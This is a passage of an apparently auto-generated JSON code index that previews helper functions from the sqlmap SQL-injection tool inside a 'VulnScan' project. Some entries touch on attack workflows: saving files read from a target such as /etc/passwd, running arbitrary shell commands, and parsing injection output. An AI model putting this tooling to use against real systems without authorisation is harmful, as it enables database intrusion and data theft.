        "documentation": {}
    },
    {
        "label": "dataToTrafficFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def dataToTrafficFile(data):\n    if not conf.trafficFile:\n        return\n    try:\n        conf.trafficFP.write(data)\n        conf.trafficFP.flush()\n    except IOError as ex:\n        errMsg = \"something went wrong while trying \"\n        errMsg += \"to write to the traffic file '%s' ('%s')\" % (conf.trafficFile, getSafeExString(ex))\n        raise SqlmapSystemException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToDumpFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def dataToDumpFile(dumpFile, data):\n    try:\n        dumpFile.write(data)\n        dumpFile.flush()\n    except IOError as ex:\n        if \"No space left\" in getUnicode(ex):\n            errMsg = \"no space left on output device\"\n            logger.error(errMsg)\n        elif \"Permission denied\" in getUnicode(ex):\n            errMsg = \"permission denied when flushing dump data\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToOutFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def dataToOutFile(filename, data):\n    \"\"\"\n    Saves data to filename\n    >>> pushValue(conf.get(\"filePath\"))\n    >>> conf.filePath = tempfile.gettempdir()\n    >>> \"_etc_passwd\" in dataToOutFile(\"/etc/passwd\", b\":::*\")\n    True\n    >>> conf.filePath = popValue()\n    \"\"\"\n    retVal = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def readInput(message, default=None, checkBatch=True, boolean=False):\n    \"\"\"\n    Reads input from terminal\n    \"\"\"\n    retVal = None\n    message = getUnicode(message)\n    if \"\\n\" in message:\n        message += \"%s> \" % (\"\\n\" if message.count(\"\\n\") > 1 else \"\")\n    elif message[-1] == ']':\n        message += \" \"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "setTechnique",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def setTechnique(technique):\n    \"\"\"\n    Thread-safe setting of currently used technique (Note: dealing with cases of per-thread technique switching)\n    \"\"\"\n    getCurrentThreadData().technique = technique\ndef getTechnique():\n    \"\"\"\n    Thread-safe getting of currently used technique\n    \"\"\"\n    return getCurrentThreadData().technique or kb.get(\"technique\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechnique",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getTechnique():\n    \"\"\"\n    Thread-safe getting of currently used technique\n    \"\"\"\n    return getCurrentThreadData().technique or kb.get(\"technique\")\ndef randomRange(start=0, stop=1000, seed=None):\n    \"\"\"\n    Returns random integer value in given range\n    >>> random.seed(0)\n    >>> randomRange(1, 500)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomRange",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def randomRange(start=0, stop=1000, seed=None):\n    \"\"\"\n    Returns random integer value in given range\n    >>> random.seed(0)\n    >>> randomRange(1, 500)\n    152\n    \"\"\"\n    if seed is not None:\n        _ = getCurrentThreadData().random\n        _.seed(seed)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def randomInt(length=4, seed=None):\n    \"\"\"\n    Returns random integer value with provided number of digits\n    >>> random.seed(0)\n    >>> randomInt(6)\n    963638\n    \"\"\"\n    if seed is not None:\n        _ = getCurrentThreadData().random\n        _.seed(seed)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def randomStr(length=4, lowercase=False, alphabet=None, seed=None):\n    \"\"\"\n    Returns random string value with provided number of characters\n    >>> random.seed(0)\n    >>> randomStr(6)\n    'FUPGpY'\n    \"\"\"\n    if seed is not None:\n        _random = getCurrentThreadData().random\n        _random.seed(seed)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "sanitizeStr",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def sanitizeStr(value):\n    \"\"\"\n    Sanitizes string value in respect to newline and line-feed characters\n    >>> sanitizeStr('foo\\\\n\\\\rbar') == 'foo bar'\n    True\n    >>> sanitizeStr(None) == 'None'\n    True\n    \"\"\"\n    return getUnicode(value).replace(\"\\n\", \" \").replace(\"\\r\", \"\")\ndef getHeader(headers, key):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getHeader",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getHeader(headers, key):\n    \"\"\"\n    Returns header value ignoring the letter case\n    >>> getHeader({\"Foo\": \"bar\"}, \"foo\")\n    'bar'\n    \"\"\"\n    retVal = None\n    for header in (headers or {}):\n        if header.upper() == key.upper():\n            retVal = headers[header]",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkPipedInput",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def checkPipedInput():\n    \"\"\"\n    Checks whether input to program has been provided via standard input (e.g. cat /tmp/req.txt | python sqlmap.py -r -)\n    # Reference: https://stackoverflow.com/a/33873570\n    \"\"\"\n    return hasattr(sys.stdin, \"fileno\") and not os.isatty(sys.stdin.fileno())\ndef isZipFile(filename):\n    \"\"\"\n    Checks if file contains zip compressed content\n    >>> isZipFile(paths.WORDLIST)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isZipFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isZipFile(filename):\n    \"\"\"\n    Checks if file contains zip compressed content\n    >>> isZipFile(paths.WORDLIST)\n    True\n    \"\"\"\n    checkFile(filename)\n    return openFile(filename, \"rb\", encoding=None).read(len(ZIP_HEADER)) == ZIP_HEADER\ndef isDigit(value):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isDigit(value):\n    \"\"\"\n    Checks if provided (string) value consists of digits (Note: Python's isdigit() is problematic)\n    >>> u'\\xb2'.isdigit()\n    True\n    >>> isDigit(u'\\xb2')\n    False\n    >>> isDigit('123456')\n    True\n    >>> isDigit('3b3')",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def checkFile(filename, raiseOnError=True):\n    \"\"\"\n    Checks for file existence and readability\n    >>> checkFile(__file__)\n    True\n    \"\"\"\n    valid = True\n    if filename:\n        filename = filename.strip('\"\\'')\n    if filename == STDIN_PIPE_DASH:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def banner():\n    \"\"\"\n    This function prints sqlmap banner with its version\n    \"\"\"\n    if not any(_ in sys.argv for _ in (\"--version\", \"--api\")) and not conf.get(\"disableBanner\"):\n        result = BANNER\n        if not IS_TTY or any(_ in sys.argv for _ in (\"--disable-coloring\", \"--disable-colouring\")):\n            result = clearColors(result)\n        elif IS_WIN:\n            coloramainit()",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseJson",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseJson(content):\n    \"\"\"\n    This function parses POST_HINT.JSON and POST_HINT.JSON_LIKE content\n    >>> parseJson(\"{'id':1}\")[\"id\"] == 1\n    True\n    >>> parseJson('{\"id\":1}')[\"id\"] == 1\n    True\n    \"\"\"\n    quote = None\n    retVal = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parsePasswordHash",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parsePasswordHash(password):\n    \"\"\"\n    In case of Microsoft SQL Server password hash value is expanded to its components\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.MSSQL\n    >>> \"salt: 4086ceb6\" in parsePasswordHash(\"0x01004086ceb60c90646a8ab9889fe3ed8e5c150b5460ece8425a\")\n    True\n    >>> kb.forcedDbms = popValue()\n    \"\"\"\n    blank = ' ' * 8",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "cleanQuery",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def cleanQuery(query):\n    \"\"\"\n    Switch all SQL statement (alike) keywords to upper case\n    >>> cleanQuery(\"select id from users\")\n    'SELECT id FROM users'\n    \"\"\"\n    retVal = query\n    for sqlStatements in SQL_STATEMENTS.values():\n        for sqlStatement in sqlStatements:\n            candidate = sqlStatement.replace(\"(\", \"\").replace(\")\", \"\").strip()",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "cleanReplaceUnicode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def cleanReplaceUnicode(value):\n    \"\"\"\n    Cleans unicode for proper encode/decode\n    >>> cleanReplaceUnicode(['a', 'b'])\n    ['a', 'b']\n    \"\"\"\n    def clean(value):\n        return value.encode(UNICODE_ENCODING, errors=\"replace\").decode(UNICODE_ENCODING) if isinstance(value, six.text_type) else value\n    return applyFunctionRecursively(value, clean)\ndef setPaths(rootPath):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "setPaths",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def setPaths(rootPath):\n    \"\"\"\n    Sets absolute paths for project directories and files\n    \"\"\"\n    paths.SQLMAP_ROOT_PATH = rootPath\n    # sqlmap paths\n    paths.SQLMAP_DATA_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"data\")\n    paths.SQLMAP_EXTRAS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"extra\")\n    paths.SQLMAP_SETTINGS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"lib\", \"core\", \"settings.py\")\n    paths.SQLMAP_TAMPER_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"tamper\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "weAreFrozen",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def weAreFrozen():\n    \"\"\"\n    Returns whether we are frozen via py2exe.\n    This will affect how we find out where we are located.\n    # Reference: http://www.py2exe.org/index.cgi/WhereAmI\n    \"\"\"\n    return hasattr(sys, \"frozen\")\ndef parseTargetDirect():\n    \"\"\"\n    Parse target dbms and set some attributes into the configuration singleton",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseTargetDirect",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseTargetDirect():\n    \"\"\"\n    Parse target dbms and set some attributes into the configuration singleton\n    >>> pushValue(conf.direct)\n    >>> conf.direct = \"mysql://root:testpass@127.0.0.1:3306/testdb\"\n    >>> parseTargetDirect()\n    >>> conf.dbmsDb\n    'testdb'\n    >>> conf.dbmsPass\n    'testpass'",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseTargetUrl",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseTargetUrl():\n    \"\"\"\n    Parse target URL and set some attributes into the configuration singleton\n    >>> pushValue(conf.url)\n    >>> conf.url = \"https://www.test.com/?id=1\"\n    >>> parseTargetUrl()\n    >>> conf.hostname\n    'www.test.com'\n    >>> conf.scheme\n    'https'",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "escapeJsonValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def escapeJsonValue(value):\n    \"\"\"\n    Escapes JSON value (used in payloads)\n    # Reference: https://stackoverflow.com/a/16652683\n    >>> \"\\\\n\" in escapeJsonValue(\"foo\\\\nbar\")\n    False\n    >>> \"\\\\\\\\t\" in escapeJsonValue(\"foo\\\\tbar\")\n    True\n    \"\"\"\n    retVal = \"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "expandAsteriskForColumns",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def expandAsteriskForColumns(expression):\n    \"\"\"\n    If the user provided an asterisk rather than the column(s)\n    name, sqlmap will retrieve the columns itself and reprocess\n    the SQL query string (expression)\n    \"\"\"\n    match = re.search(r\"(?i)\\ASELECT(\\s+TOP\\s+[\\d]+)?\\s+\\*\\s+FROM\\s+(([`'\\\"][^`'\\\"]+[`'\\\"]|[\\w.]+)+)(\\s|\\Z)\", expression)\n    if match:\n        infoMsg = \"you did not provide the fields in your query. \"\n        infoMsg += \"sqlmap will retrieve the column names itself\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLimitRange",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getLimitRange(count, plusOne=False):\n    \"\"\"\n    Returns range of values used in limit/offset constructs\n    >>> [_ for _ in getLimitRange(10)]\n    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n    \"\"\"\n    retVal = None\n    count = int(count)\n    limitStart, limitStop = 1, count\n    reverse = False",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseUnionPage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseUnionPage(page):\n    \"\"\"\n    Returns resulting items from UNION query inside provided page content\n    >>> parseUnionPage(\"%sfoo%s%sbar%s\" % (kb.chars.start, kb.chars.stop, kb.chars.start, kb.chars.stop))\n    ['foo', 'bar']\n    \"\"\"\n    if page is None:\n        return None\n    if re.search(r\"(?si)\\A%s.*%s\\Z\" % (kb.chars.start, kb.chars.stop), page):\n        if len(page) > LARGE_OUTPUT_THRESHOLD:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseFilePaths",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseFilePaths(page):\n    \"\"\"\n    Detects (possible) absolute system paths inside the provided page content\n    >>> _ = \"/var/www/html/index.php\"; parseFilePaths(\"<html>Error occurred at line 207 of: %s<br>Please contact your administrator</html>\" % _); _ in kb.absFilePaths\n    True\n    \"\"\"\n    if page:\n        for regex in FILE_PATH_REGEXES:\n            for match in re.finditer(regex, page):\n                absFilePath = match.group(\"result\").strip()",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLocalIP",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getLocalIP():\n    \"\"\"\n    Get local IP address (exposed to the remote/target)\n    \"\"\"\n    retVal = None\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((conf.hostname, conf.port))\n        retVal, _ = s.getsockname()\n        s.close()",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getRemoteIP",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getRemoteIP():\n    \"\"\"\n    Get remote/target IP address\n    >>> pushValue(conf.hostname)\n    >>> conf.hostname = \"localhost\"\n    >>> getRemoteIP() == \"127.0.0.1\"\n    True\n    >>> conf.hostname = popValue()\n    \"\"\"\n    retVal = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFileType",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getFileType(filePath):\n    \"\"\"\n    Returns \"magic\" file type for given file path\n    >>> getFileType(__file__)\n    'text'\n    >>> getFileType(sys.executable)\n    'binary'\n    \"\"\"\n    try:\n        desc = magic.from_file(filePath) or magic.MAGIC_UNKNOWN_FILETYPE",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getCharset",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getCharset(charsetType=None):\n    \"\"\"\n    Returns list with integers representing characters of a given\n    charset type appropriate for inference techniques\n    >>> getCharset(CHARSET_TYPE.BINARY)\n    [0, 1, 47, 48, 49]\n    \"\"\"\n    asciiTbl = []\n    if charsetType is None:\n        asciiTbl.extend(xrange(0, 128))",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "directoryPath",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def directoryPath(filepath):\n    \"\"\"\n    Returns directory path for a given filepath\n    >>> directoryPath('/var/log/apache.log')\n    '/var/log'\n    >>> directoryPath('/var/log')\n    '/var/log'\n    \"\"\"\n    retVal = filepath\n    if filepath and os.path.splitext(filepath)[-1]:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizePath",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def normalizePath(filepath):\n    \"\"\"\n    Returns normalized string representation of a given filepath\n    >>> normalizePath('//var///log/apache.log')\n    '/var/log/apache.log'\n    \"\"\"\n    retVal = filepath\n    if retVal:\n        retVal = retVal.strip(\"\\r\\n\")\n        retVal = ntpath.normpath(retVal) if isWindowsDriveLetterPath(retVal) else re.sub(r\"\\A/{2,}\", \"/\", posixpath.normpath(retVal))",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeFilepathEncode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def safeFilepathEncode(filepath):\n    \"\"\"\n    Returns filepath in (ASCII) format acceptable for OS handling (e.g. reading)\n    >>> 'sqlmap' in safeFilepathEncode(paths.SQLMAP_HOME_PATH)\n    True\n    \"\"\"\n    retVal = filepath\n    if filepath and six.PY2 and isinstance(filepath, six.text_type):\n        retVal = getBytes(filepath, sys.getfilesystemencoding() or UNICODE_ENCODING)\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeExpandUser",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def safeExpandUser(filepath):\n    \"\"\"\n    Patch for a Python Issue18171 (http://bugs.python.org/issue18171)\n    >>> os.path.basename(__file__) in safeExpandUser(__file__)\n    True\n    \"\"\"\n    retVal = filepath\n    try:\n        retVal = os.path.expanduser(filepath)\n    except UnicodeError:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def safeStringFormat(format_, params):\n    \"\"\"\n    Avoids problems with inappropriate string format strings\n    >>> safeStringFormat('SELECT foo FROM %s LIMIT %d', ('bar', '1'))\n    'SELECT foo FROM bar LIMIT 1'\n    >>> safeStringFormat(\"SELECT foo FROM %s WHERE name LIKE '%susan%' LIMIT %d\", ('bar', '1'))\n    \"SELECT foo FROM bar WHERE name LIKE '%susan%' LIMIT 1\"\n    \"\"\"\n    if format_.count(PAYLOAD_DELIMITER) == 2:\n        _ = format_.split(PAYLOAD_DELIMITER)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFilteredPageContent",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getFilteredPageContent(page, onlyText=True, split=\" \"):\n    \"\"\"\n    Returns filtered page content without script, style and/or comments\n    or all HTML tags\n    >>> getFilteredPageContent(u'<html><title>foobar</title><body>test</body></html>') == \"foobar test\"\n    True\n    \"\"\"\n    retVal = page\n    # only if the page's charset has been successfully identified\n    if isinstance(page, six.text_type):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPageWordSet",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getPageWordSet(page):\n    \"\"\"\n    Returns word set used in page content\n    >>> sorted(getPageWordSet(u'<html><title>foobar</title><body>test</body></html>')) == [u'foobar', u'test']\n    True\n    \"\"\"\n    retVal = set()\n    # only if the page's charset has been successfully identified\n    if isinstance(page, six.string_types):\n        retVal = set(_.group(0) for _ in re.finditer(r\"\\w+\", getFilteredPageContent(page)))",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "showStaticWords",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def showStaticWords(firstPage, secondPage, minLength=3):\n    \"\"\"\n    Prints words appearing in two different response pages\n    >>> showStaticWords(\"this is a test\", \"this is another test\")\n    ['this']\n    \"\"\"\n    infoMsg = \"finding static words in longest matching part of dynamic page content\"\n    logger.info(infoMsg)\n    firstPage = getFilteredPageContent(firstPage)\n    secondPage = getFilteredPageContent(secondPage)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isWindowsDriveLetterPath",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isWindowsDriveLetterPath(filepath):\n    \"\"\"\n    Returns True if given filepath starts with a Windows drive letter\n    >>> isWindowsDriveLetterPath('C:\\\\boot.ini')\n    True\n    >>> isWindowsDriveLetterPath('/var/log/apache.log')\n    False\n    \"\"\"\n    return re.search(r\"\\A[\\w]\\:\", filepath) is not None\ndef posixToNtSlashes(filepath):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "posixToNtSlashes",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def posixToNtSlashes(filepath):\n    \"\"\"\n    Replaces all occurrences of Posix slashes in provided\n    filepath with NT backslashes\n    >>> posixToNtSlashes('C:/Windows')\n    'C:\\\\\\\\Windows'\n    \"\"\"\n    return filepath.replace('/', '\\\\') if filepath else filepath\ndef ntToPosixSlashes(filepath):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "ntToPosixSlashes",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def ntToPosixSlashes(filepath):\n    \"\"\"\n    Replaces all occurrences of NT backslashes in provided\n    filepath with Posix slashes\n    >>> ntToPosixSlashes('C:\\\\Windows')\n    'C:/Windows'\n    \"\"\"\n    return filepath.replace('\\\\', '/') if filepath else filepath\ndef isHexEncodedString(subject):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isHexEncodedString",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isHexEncodedString(subject):\n    \"\"\"\n    Checks if the provided string is hex encoded\n    >>> isHexEncodedString('DEADBEEF')\n    True\n    >>> isHexEncodedString('test')\n    False\n    \"\"\"\n    return re.match(r\"\\A[0-9a-fA-Fx]+\\Z\", subject) is not None\n@cachedmethod",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getConsoleWidth",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getConsoleWidth(default=80):\n    \"\"\"\n    Returns console width\n    >>> any((getConsoleWidth(), True))\n    True\n    \"\"\"\n    width = None\n    if os.getenv(\"COLUMNS\", \"\").isdigit():\n        width = int(os.getenv(\"COLUMNS\"))\n    else:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "shellExec",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def shellExec(cmd):\n    \"\"\"\n    Executes arbitrary shell command\n    >>> shellExec('echo 1').strip() == '1'\n    True\n    \"\"\"\n    retVal = \"\"\n    try:\n        retVal = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0] or \"\"\n    except Exception as ex:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def clearConsoleLine(forceOutput=False):\n    \"\"\"\n    Clears current console line\n    \"\"\"\n    if IS_TTY:\n        dataToStdout(\"\\r%s\\r\" % (\" \" * (getConsoleWidth() - 1)), forceOutput)\n    kb.prependFlag = False\ndef parseXmlFile(xmlFile, handler):\n    \"\"\"\n    Parses XML file by a given handler",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseXmlFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseXmlFile(xmlFile, handler):\n    \"\"\"\n    Parses XML file by a given handler\n    \"\"\"\n    try:\n        with contextlib.closing(io.StringIO(readCachedFileContent(xmlFile))) as stream:\n            parse(stream, handler)\n    except (SAXParseException, UnicodeError) as ex:\n        errMsg = \"something appears to be wrong with \"\n        errMsg += \"the file '%s' ('%s'). Please make \" % (xmlFile, getSafeExString(ex))",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSQLSnippet",
        "kind": 2,
